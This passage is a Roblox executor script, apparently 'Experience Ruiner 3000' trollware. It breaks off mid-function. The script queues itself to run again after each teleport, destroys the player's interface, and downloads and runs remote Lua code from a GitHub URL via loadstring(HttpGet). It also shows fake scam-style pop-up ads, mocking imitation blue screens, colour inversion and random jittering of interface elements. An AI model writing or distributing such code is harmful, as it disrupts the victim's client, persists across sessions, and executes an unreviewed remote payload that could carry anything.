repeat task.wait() until (game:IsLoaded())

local running = true
local players = game:GetService("Players")
local localplayer = players.LocalPlayer
local rblxgui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
local uis = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local mouse = localplayer:GetMouse()
local mouselocation = uis:GetMouseLocation()
local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end

function runFunction(func) task.spawn(function() func() end) end

local function GetCharacter()
    runFunction(function()
        if game.Players.LocalPlayer.Character ~= nil then return true else return false end
    end)
end

local TELEPORT_SCRIPT = [[
    wait(1.2)
    local players = game:GetService("Players")
    local localplayer = players.LocalPlayer
    
    for _, coreasset in ipairs(game.CoreGui:GetDescendants()) do
        coreasset:Destroy()
    end
    for _, starterasset in ipairs(game.StarterGui:GetDescendants()) do
        starterasset:Destroy()
    end
    for _, plrasset in ipairs(localplayer.PlayerGui:GetDescendants()) do
        plrasset:Destroy()
    end
    local lolxd = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local ImageLabel = Instance.new("ImageLabel")
    lolxd.Name = "lolxd"
    lolxd.Parent = game.CoreGui
    lolxd.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    lolxd.DisplayOrder = 999999999
    Frame.Parent = lolxd
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(124, 127, 137)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.5, 0, 0.450748146, 0)
    Frame.Size = UDim2.new(1.00063288, 0, 1.0972569, 0)
    Frame.ZIndex = math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge
    ImageLabel.Parent = Frame
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel.BorderSizePixel = 0
    ImageLabel.Position = UDim2.new(0.444213718, 0, 0.444734752, 0)
    ImageLabel.Size = UDim2.new(0.110689439, 0, 0.198863626, 0)
    ImageLabel.Image = "rbxassetid://14195957999"
    local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
    loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/Experience-Ruiner-3000/Experuiner3k/lol.lua'))()
]]

local function RUN_SCRIPT()
    queue_on_teleport(TELEPORT_SCRIPT)
    local lolxd = Instance.new("ScreenGui")
    local AD1 = Instance.new("Frame")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local UICorner = Instance.new("UICorner")
    local TextButton = Instance.new("TextButton")
    local UICorner_2 = Instance.new("UICorner")
    local UICorner_3 = Instance.new("UICorner")
    local AD2 = Instance.new("Frame")
    local Frame_2 = Instance.new("Frame")
    local TextLabel_2 = Instance.new("TextLabel")
    local UICorner_4 = Instance.new("UICorner")
    local TextButton_2 = Instance.new("TextButton")
    local UICorner_5 = Instance.new("UICorner")
    local AD3 = Instance.new("Frame")
    local Frame_3 = Instance.new("Frame")
    local TextLabel_3 = Instance.new("TextLabel")
    local UICorner_6 = Instance.new("UICorner")
    local TextButton_3 = Instance.new("TextButton")
    local UICorner_7 = Instance.new("UICorner")
    local UICorner_8 = Instance.new("UICorner")
    lolxd.Name = "lolxd"
    lolxd.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    lolxd.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    AD1.Name = "AD1"
    AD1.Parent = lolxd
    AD1.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    AD1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    AD1.BorderSizePixel = 0
    AD1.Position = UDim2.new(0.135443062, 0, 0.149625912, 0)
    AD1.Size = UDim2.new(0.175316453, 0, 0.471321732, 0)
    AD1.Visible = false
    Frame.Parent = AD1
    Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.28681004, 0, 0.193121716, 0)
    Frame.Size = UDim2.new(0.4208, 0, 0.611111104, 0)
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.186311781, 0, 0.20348835, 0)
    TextLabel.Size = UDim2.new(0.623574138, 0, 0.209302321, 0)
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "HOT EGIRLS IN YOUR AREA"
    TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14.000
    TextLabel.TextWrapped = true
    UICorner.Parent = TextLabel
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(38, 255, 0)
    TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.BorderSizePixel = 0
    TextButton.Position = UDim2.new(0.133079842, 0, 0.558139563, 0)
    TextButton.Size = UDim2.new(0.760456264, 0, 0.290697634, 0)
    TextButton.Font = Enum.Font.SourceSans
    TextButton.Text = "FIND"
    TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.TextSize = 14.000
    UICorner_2.Parent = Frame
    UICorner_3.Parent = AD1
    AD2.Name = "AD2"
    AD2.Parent = lolxd
    AD2.BackgroundColor3 = Color3.fromRGB(146, 10, 170)
    AD2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    AD2.BorderSizePixel = 0
    AD2.Position = UDim2.new(0.739873409, 0, 0.457605958, 0)
    AD2.Size = UDim2.new(0.175316453, 0, 0.471321732, 0)
    AD2.Visible = false
    Frame_2.Parent = AD2
    Frame_2.BackgroundColor3 = Color3.fromRGB(44, 139, 255)
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(0.28681004, 0, 0.193121716, 0)
    Frame_2.Size = UDim2.new(0.4208, 0, 0.611111104, 0)
    TextLabel_2.Parent = Frame_2
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_2.BorderSizePixel = 0
    TextLabel_2.Position = UDim2.new(0.186311767, 0, 0.0562770516, 0)
    TextLabel_2.Size = UDim2.new(0.623574138, 0, 0.412790656, 0)
    TextLabel_2.Font = Enum.Font.SourceSans
    TextLabel_2.Text = "NEW BLOXY COLA OUT NOW FOR FREE"
    TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_2.TextScaled = true
    TextLabel_2.TextSize = 14.000
    TextLabel_2.TextWrapped = true
    UICorner_4.Parent = TextLabel_2
    TextButton_2.Parent = Frame_2
    TextButton_2.BackgroundColor3 = Color3.fromRGB(170, 85, 0)
    TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton_2.BorderSizePixel = 0
    TextButton_2.Position = UDim2.new(0.133079842, 0, 0.558139563, 0)
    TextButton_2.Size = UDim2.new(0.760456264, 0, 0.290697634, 0)
    TextButton_2.Font = Enum.Font.SourceSans
    TextButton_2.Text = "GET"
    TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextButton_2.TextSize = 14.000
    UICorner_5.Parent = Frame_2
    AD3.Name = "AD3"
    AD3.Parent = lolxd
    AD3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    AD3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    AD3.BorderSizePixel = 0
    AD3.Position = UDim2.new(0.587974668, 0, 0.0423939824, 0)
    AD3.Size = UDim2.new(0.175316453, 0, 0.471321732, 0)
    AD3.Visible = false
    Frame_3.Parent = AD3
    Frame_3.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_3.BorderSizePixel = 0
    Frame_3.Position = UDim2.new(0.28681004, 0, 0.193121716, 0)
    Frame_3.Size = UDim2.new(0.4208, 0, 0.611111104, 0)
    TextLabel_3.Parent = Frame_3
    TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_3.BorderSizePixel = 0
    TextLabel_3.Position = UDim2.new(0.186311767, 0, 0.0562770516, 0)
    TextLabel_3.Size = UDim2.new(0.623574138, 0, 0.412790656, 0)
    TextLabel_3.Font = Enum.Font.SourceSans
    TextLabel_3.Text = "WANT FREE FEMBOY PICS?"
    TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_3.TextScaled = true
    TextLabel_3.TextSize = 14.000
    TextLabel_3.TextWrapped = true
    UICorner_6.Parent = TextLabel_3
    TextButton_3.Parent = Frame_3
    TextButton_3.BackgroundColor3 = Color3.fromRGB(170, 85, 0)
    TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton_3.BorderSizePixel = 0
    TextButton_3.Position = UDim2.new(0.133079842, 0, 0.558139563, 0)
    TextButton_3.Size = UDim2.new(0.760456264, 0, 0.290697634, 0)
    TextButton_3.Font = Enum.Font.SourceSans
    TextButton_3.Text = "CLAIM"
    TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextButton_3.TextSize = 14.000
    UICorner_7.Parent = Frame_3
    UICorner_8.Parent = AD3
    runFunction(function()
        wait(1.2)
        AD1.Visible = true
        wait(1.2)
        AD2.Visible = true
        wait(1.2)
        AD3.Visible = true
    end)
    local errors = Instance.new("ScreenGui")
    local popups = Instance.new("ScreenGui")
    local funnyslidiy = Instance.new("ScreenGui")

    errors.Parent = rblxgui
    errors.ResetOnSpawn = false
    errors.ZIndexBehavior = Enum.ZIndexBehavior.Global
    popups.Parent = rblxgui
    popups.ResetOnSpawn = false
    popups.ZIndexBehavior = Enum.ZIndexBehavior.Global
    funnyslidiy.Name = "funnyslidiy"
    funnyslidiy.Parent = rblxgui
    funnyslidiy.ZIndexBehavior = Enum.ZIndexBehavior.Global
    -- // 12055532346
    -- // the time stuff

    local popupwait = 4
    local invertWait = 1
    local stringreversewait = 1
    local messUISwait = 0.25
    local errorSoundWait = 0.5
    local scaleFactor = 0.8
    local framepayloadRate = 2
    local framepayloadRate2 = 2
    local mousep = 0.1

    -- // ---------------

    local function invertColor(color)
        return Color3.new(1 - color.r, 1 - color.g, 1 - color.b)
    end

    local function invertAssetsWithColor()
        runFunction(function()
            if running then
                for _, element in ipairs(game:GetDescendants()) do
                    if element:IsA("BasePart") then
                        element.BrickColor = BrickColor.new(invertColor(element.BrickColor.Color))
                    elseif element:IsA("ImageLabel") then
                        element.ImageColor3 = invertColor(element.ImageColor3)
                    elseif element:IsA("Frame") then
                        element.BackgroundColor3 = invertColor(element.BackgroundColor3)
                    elseif element:IsA("TextLabel") then
                        element.BackgroundColor3 = invertColor(element.BackgroundColor3)
                        element.TextColor3 = invertColor(element.TextColor3)
                    elseif element:IsA("TextBox") then
                        element.BackgroundColor3 = invertColor(element.BackgroundColor3)
                        element.TextColor3 = invertColor(element.TextColor3)
                    elseif element:IsA("TextButton") then
                        element.BackgroundColor3 = invertColor(element.BackgroundColor3)
                        element.TextColor3 = invertColor(element.TextColor3)
                    elseif element:IsA("Decal") then
                        element.Color3 = Color3.new(0,0,255)
                    elseif element:IsA("Fire") then
                        element.Color = invertColor(element.Color)
                        element.SecondaryColor = invertColor(element.SecondaryColor)
                    end
                end
            end
        end)
    end

    local function BSoD()
        runFunction(function()
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
            local BlueScreen = Instance.new("ScreenGui")
            local Frame = Instance.new("Frame")
            local TextLabel = Instance.new("TextLabel")
            local TextLabel_2 = Instance.new("TextLabel")
            local TextLabel_3 = Instance.new("TextLabel")
            local TextLabel_4 = Instance.new("TextLabel")
            local TextLabel_5 = Instance.new("TextLabel")
            local TextLabel_6 = Instance.new("TextLabel")
            BlueScreen.Name = "BlueScreen"
            BlueScreen.Parent = game.CoreGui
            BlueScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
            Frame.Parent = BlueScreen
            Frame.BackgroundColor3 = Color3.fromRGB(0, 145, 255)
            Frame.Position = UDim2.new(-0.532270908, 0, -0.0753086358, 0)
            Frame.Size = UDim2.new(6.3284812, 0, 12.4675808, 0)
            Frame.ZIndex = math.huge
            TextLabel.Parent = BlueScreen
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.Position = UDim2.new(0.0578965247, 0, 0.417123854, 0)
            TextLabel.Size = UDim2.new(0.754430354, 0, 0.0498753116, 0)
            TextLabel.ZIndex = 999999999
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "0% complete"
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextWrapped = true
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel_2.Parent = BlueScreen
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.Position = UDim2.new(0.248532459, 0, 0.709990382, 0)
            TextLabel_2.Size = UDim2.new(0.277215183, 0, 0.0299251862, 0)
            TextLabel_2.ZIndex = 999999999
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = "Stop code: BEST_TO_REJOIN_NOW"
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 14.000
            TextLabel_2.TextWrapped = true
            TextLabel_3.Parent = BlueScreen
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.Position = UDim2.new(0.0584163778, 0, 0.296185434, 0)
            TextLabel_3.Size = UDim2.new(0.754430354, 0, 0.110972568, 0)
            TextLabel_3.ZIndex = 999999999
            TextLabel_3.Font = Enum.Font.SourceSans
            TextLabel_3.Text = "Your client ran into a problem and needs to be fixed. We're just cleaning things up."
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextScaled = true
            TextLabel_3.TextSize = 14.000
            TextLabel_3.TextWrapped = true
            TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel_4.Parent = BlueScreen
            TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.BackgroundTransparency = 1.000
            TextLabel_4.Position = UDim2.new(0.262925535, 0, 0.601902604, 0)
            TextLabel_4.Size = UDim2.new(0.571518958, 0, 0.0536159612, 0)
            TextLabel_4.ZIndex = 999999999
            TextLabel_4.Font = Enum.Font.SourceSans
            TextLabel_4.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
            TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.TextScaled = true
            TextLabel_4.TextSize = 14.000
            TextLabel_4.TextWrapped = true
            TextLabel_5.Parent = BlueScreen
            TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.BackgroundTransparency = 1.000
            TextLabel_5.Position = UDim2.new(0.0207171198, 0, 0.0419752523, 0)
            TextLabel_5.Size = UDim2.new(0.129746839, 0, 0.230673313, 0)
            TextLabel_5.ZIndex = 999999999
            TextLabel_5.Font = Enum.Font.SourceSans
            TextLabel_5.Text = ":("
            TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.TextScaled = true
            TextLabel_5.TextSize = 14.000
            TextLabel_5.TextWrapped = true
            TextLabel_6.Parent = BlueScreen
            TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.BackgroundTransparency = 1.000
            TextLabel_6.Position = UDim2.new(0.249001458, 0, 0.670385659, 0)
            TextLabel_6.Size = UDim2.new(0.277215183, 0, 0.0299251862, 0)
            TextLabel_6.ZIndex = 999999999
            TextLabel_6.Font = Enum.Font.SourceSans
            TextLabel_6.Text = "If you call a support person, give them this info:"
            TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.TextScaled = true
            TextLabel_6.TextSize = 14.000
            TextLabel_6.TextWrapped = true
            runFunction(function()
                for _, errorimg in ipairs(errors:GetChildren()) do
                    errorimg:Destroy()
                end

                for _, popupf in ipairs(popups:GetChildren()) do
                    popupf:Destroy()
                end

                for _, slide in ipairs(funnyslidiy:GetChildren()) do
                    slide:Destroy()
                end

                for _, sound in ipairs(game:GetService("Workspace"):GetChildren()) do
                    if sound.Name == "Windows 10 Error Sound" then
                        sound:Destroy()
                    end
                end

                for _, asset in ipairs(rblxgui:GetChildren()) do
                    asset:Destroy()
                    for _, clonedasset in ipairs(BSoDrestorerblxgui:GetChildren()) do
                        clonedasset.Parent = rblxgui
                    end
                end
            end)

            for i = 0, 100 do
                i += 1
                TextLabel.Text = (i).."% complete"
                task.wait(0.3)
            end
            TextLabel.Text = "Failed to fix, LMAO!"
            task.wait(3)
            BlueScreen:Destroy()
        end)
    end

    local function BSoD2()
        runFunction(function()
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
            local BlueScreen = Instance.new("ScreenGui")
            local Frame = Instance.new("Frame")
            local TextLabel = Instance.new("TextLabel")
            local TextLabel_2 = Instance.new("TextLabel")
            local TextLabel_3 = Instance.new("TextLabel")
            local TextLabel_4 = Instance.new("TextLabel")
            local TextLabel_5 = Instance.new("TextLabel")
            local TextLabel_6 = Instance.new("TextLabel")
            BlueScreen.Name = "BlueScreen"
            BlueScreen.Parent = game.CoreGui
            BlueScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
            Frame.Parent = BlueScreen
            Frame.BackgroundColor3 = Color3.fromRGB(0, 145, 255)
            Frame.Position = UDim2.new(-0.532270908, 0, -0.0753086358, 0)
            Frame.Size = UDim2.new(6.3284812, 0, 12.4675808, 0)
            Frame.ZIndex = math.huge
            TextLabel.Parent = BlueScreen
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.Position = UDim2.new(0.0578965247, 0, 0.417123854, 0)
            TextLabel.Size = UDim2.new(0.754430354, 0, 0.0498753116, 0)
            TextLabel.ZIndex = 999999999
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "0% complete"
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextWrapped = true
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel_2.Parent = BlueScreen
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.Position = UDim2.new(0.248532459, 0, 0.709990382, 0)
            TextLabel_2.Size = UDim2.new(0.277215183, 0, 0.0299251862, 0)
            TextLabel_2.ZIndex = 999999999
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = "Stop code: LOL_WUT_LMAO"
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 14.000
            TextLabel_2.TextWrapped = true
            TextLabel_3.Parent = BlueScreen
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.Position = UDim2.new(0.0584163778, 0, 0.296185434, 0)
            TextLabel_3.Size = UDim2.new(0.754430354, 0, 0.110972568, 0)
            TextLabel_3.ZIndex = 999999999
            TextLabel_3.Font = Enum.Font.SourceSans
            TextLabel_3.Text = "Your client ran into a critical error and is required to reset."
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextScaled = true
            TextLabel_3.TextSize = 14.000
            TextLabel_3.TextWrapped = true
            TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel_4.Parent = BlueScreen
            TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.BackgroundTransparency = 1.000
            TextLabel_4.Position = UDim2.new(0.262925535, 0, 0.601902604, 0)
            TextLabel_4.Size = UDim2.new(0.571518958, 0, 0.0536159612, 0)
            TextLabel_4.ZIndex = 999999999
            TextLabel_4.Font = Enum.Font.SourceSans
            TextLabel_4.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
            TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.TextScaled = true
            TextLabel_4.TextSize = 14.000
            TextLabel_4.TextWrapped = true
            TextLabel_5.Parent = BlueScreen
            TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.BackgroundTransparency = 1.000
            TextLabel_5.Position = UDim2.new(0.0207171198, 0, 0.0419752523, 0)
            TextLabel_5.Size = UDim2.new(0.129746839, 0, 0.230673313, 0)
            TextLabel_5.ZIndex = 999999999
            TextLabel_5.Font = Enum.Font.SourceSans
            TextLabel_5.Text = ":("
            TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.TextScaled = true
            TextLabel_5.TextSize = 14.000
            TextLabel_5.TextWrapped = true
            TextLabel_6.Parent = BlueScreen
            TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.BackgroundTransparency = 1.000
            TextLabel_6.Position = UDim2.new(0.249001458, 0, 0.670385659, 0)
            TextLabel_6.Size = UDim2.new(0.277215183, 0, 0.0299251862, 0)
            TextLabel_6.ZIndex = 999999999
            TextLabel_6.Font = Enum.Font.SourceSans
            TextLabel_6.Text = "If you call a support person, give them deez nuts:"
            TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.TextScaled = true
            TextLabel_6.TextSize = 14.000
            TextLabel_6.TextWrapped = true
            runFunction(function()
                for _, errorimg in ipairs(errors:GetChildren()) do
                    errorimg:Destroy()
                end

                for _, popupf in ipairs(popups:GetChildren()) do
                    popupf:Destroy()
                end

                for _, slide in ipairs(funnyslidiy:GetChildren()) do
                    slide:Destroy()
                end

                for _, sound in ipairs(game:GetService("Workspace"):GetChildren()) do
                    if sound.Name == "Windows 10 Error Sound" then
                        sound:Destroy()
                    end
                end
            end)

            for i = 0, 100 do
                i += 1
                TextLabel.Text = (i).."% complete"
                task.wait(0.3)
            end
            TextLabel.Text = "Unable to fix. Must rejoin."
            task.wait(3)
            BlueScreen:Destroy()
        end)
    end

    local function slideyframe(lt)
        runFunction(function()
            if running then
                local LightBlue = Instance.new("Frame")
                local DarkOrange = Instance.new("Frame")
                local DarkBlue = Instance.new("Frame")
                local YellowMixOrange = Instance.new("Frame")
                LightBlue.Name = "LightBlue"
                LightBlue.Parent = funnyslidiy
                LightBlue.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
                LightBlue.BackgroundTransparency = 0.100
                LightBlue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                LightBlue.BorderSizePixel = 0
                LightBlue.Position = UDim2.new(-0.107278489, 0, 0.9904688, 0)
                LightBlue.Size = UDim2.new(1.21455693, 0, 1.00124693, 0)
                DarkOrange.Name = "DarkOrange"
                DarkOrange.Parent = LightBlue
                DarkOrange.BackgroundColor3 = Color3.fromRGB(255, 149, 20)
                DarkOrange.BackgroundTransparency = 0.100
                DarkOrange.BorderColor3 = Color3.fromRGB(0, 0, 0)
                DarkOrange.BorderSizePixel = 0
                DarkOrange.Position = UDim2.new(0.122459613, 0, 0.3897883, 0)
                DarkOrange.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                DarkBlue.Name = "DarkBlue"
                DarkBlue.Parent = LightBlue
                DarkBlue.BackgroundColor3 = Color3.fromRGB(40, 12, 255)
                DarkBlue.BackgroundTransparency = 0.100
                DarkBlue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                DarkBlue.BorderSizePixel = 0
                DarkBlue.Position = UDim2.new(0.336112559, 0, 0.115815692, 0)
                DarkBlue.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                YellowMixOrange.Name = "YellowMixOrange"
                YellowMixOrange.Parent = LightBlue
                YellowMixOrange.BackgroundColor3 = Color3.fromRGB(255, 223, 60)
                YellowMixOrange.BackgroundTransparency = 0.100
                YellowMixOrange.BorderColor3 = Color3.fromRGB(0, 0, 0)
                YellowMixOrange.BorderSizePixel = 0
                YellowMixOrange.Position = UDim2.new(0.0250130277, 0, 0.478206724, 0)
                YellowMixOrange.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                LightBlue:TweenPosition(
                    UDim2.new(-0.108, 0,-0.986, 0), 
                    Enum.EasingDirection.Out, 
                    Enum.EasingStyle.Linear, 
                    framepayloadRate
                )
                task.wait(framepayloadRate)
                for _, slideframe in ipairs(funnyslidiy:GetChildren()) do
                    if slideframe.Name == "LightBlue" then
                        slideframe:Destroy()
                    end
                end
            end
        end)
    end

    local function slideyframehorizontal(lt)
        runFunction(function()
            if running then
                local LightBlue = Instance.new("Frame")
                local DarkOrange = Instance.new("Frame")
                local DarkBlue = Instance.new("Frame")
                local YellowMixOrange = Instance.new("Frame")
                LightBlue.Name = "LightBlue2"
                LightBlue.Parent = funnyslidiy
                LightBlue.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
                LightBlue.BackgroundTransparency = 0.100
                LightBlue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                LightBlue.BorderSizePixel = 0
                LightBlue.Position = UDim2.new(-0.107278489, 0, 0.9904688, 0)
                LightBlue.Size = UDim2.new(1.21455693, 0, 1.00124693, 0)
                DarkOrange.Name = "DarkOrange"
                DarkOrange.Parent = LightBlue
                DarkOrange.BackgroundColor3 = Color3.fromRGB(255, 149, 20)
                DarkOrange.BackgroundTransparency = 0.100
                DarkOrange.BorderColor3 = Color3.fromRGB(0, 0, 0)
                DarkOrange.BorderSizePixel = 0
                DarkOrange.Position = UDim2.new(0.122459613, 0, 0.3897883, 0)
                DarkOrange.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                DarkBlue.Name = "DarkBlue"
                DarkBlue.Parent = LightBlue
                DarkBlue.BackgroundColor3 = Color3.fromRGB(40, 12, 255)
                DarkBlue.BackgroundTransparency = 0.100
                DarkBlue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                DarkBlue.BorderSizePixel = 0
                DarkBlue.Position = UDim2.new(0.994, 0,-0.001, 0)
                DarkBlue.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                YellowMixOrange.Name = "YellowMixOrange"
                YellowMixOrange.Parent = LightBlue
                YellowMixOrange.BackgroundColor3 = Color3.fromRGB(255, 223, 60)
                YellowMixOrange.BackgroundTransparency = 0.100
                YellowMixOrange.BorderColor3 = Color3.fromRGB(0, 0, 0)
                YellowMixOrange.BorderSizePixel = 0
                YellowMixOrange.Position = UDim2.new(0.0250130277, 0, 0.478206724, 0)
                YellowMixOrange.Size = UDim2.new(0.434080243, 0, 0.479452044, 0)
                LightBlue:TweenPosition(
                    UDim2.new(-0.933, 0,-0.001, 0), 
                    Enum.EasingDirection.Out, 
                    Enum.EasingStyle.Linear, 
                    framepayloadRate2
                )
                task.wait(framepayloadRate2)
                for _, slideframe in ipairs(funnyslidiy:GetChildren()) do
                    if slideframe.Name == "LightBlue2" then
                        slideframe:Destroy()
                    end
                end
            end
        end)
    end

    local function revealUIS()
        runFunction(function()
            if running then
                for _, element in ipairs(game:GetDescendants()) do
                    if element:IsA("ImageLabel") then
                        element.Visible = true
                    elseif element:IsA("Frame") then
                        element.Visible = true
                    elseif element:IsA("TextLabel") then
                        element.Visible = true
                    elseif element:IsA("TextButton") then
                        element.Visible = true
                    elseif element:IsA("Textbox") then
                        element.Visible = true
                    end
                end
            end
        end)
    end

    local function messUIS()
        runFunction(function()
            if running then
                for _, element in ipairs(game:GetDescendants()) do
                    if element:IsA("ImageLabel") and element.Parent ~= errors then
                        element.Position = element.Position + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                        element.Size = element.Size + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                    elseif element:IsA("Frame") then
                        element.Position = element.Position + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                        element.Size = element.Size + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                    elseif element:IsA("TextLabel") then
                        element.Position = element.Position + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                        element.Size = element.Size + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                    elseif element:IsA("TextButton") then
                        element.Position = element.Position + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                        element.Size = element.Size + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                    elseif element:IsA("TextBox") then
                        element.Position = element.Position + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                        element.Size = element.Size + UDim2.new(0, math.random(-1, 1), 0, math.random(-1, 1))
                    end
                end
            end
        end)
    end

    local function duplicateAndScale(element)
        runFunction(function()
            if running then
                local duplicate = element:Clone()
                duplicate.Parent = element.Parent
                duplicate.Position = UDim2.new(0, math.random(), 0, math.random()) -- Random position on the screen
